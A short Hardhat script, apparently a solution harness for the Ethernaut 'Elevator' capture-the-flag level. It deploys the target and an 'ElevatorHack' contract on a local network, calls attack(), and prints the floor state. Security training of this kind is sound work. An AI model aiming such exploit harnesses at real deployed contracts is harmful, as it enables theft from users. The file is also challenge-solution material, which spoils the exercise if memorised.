const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const Elevator = await ethers.getContractFactory('Elevator')
    const elevator = await Elevator.deploy()
    await elevator.deployed()

    const ElevatorHack = await ethers.getContractFactory('ElevatorHack')
    const elevatorHack = await ElevatorHack.deploy(elevator.address)
    await elevatorHack.deployed()

    const hacker = await elevator.connect(addr1)
    const hackerHack = await elevatorHack.connect(addr1)

    // ------------ let's hack -------------
    console.log(await hacker.floor())
    console.log(await hacker.top())

    await hackerHack.attack()

    console.log(await hacker.floor())
    console.log(await hacker.top())
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
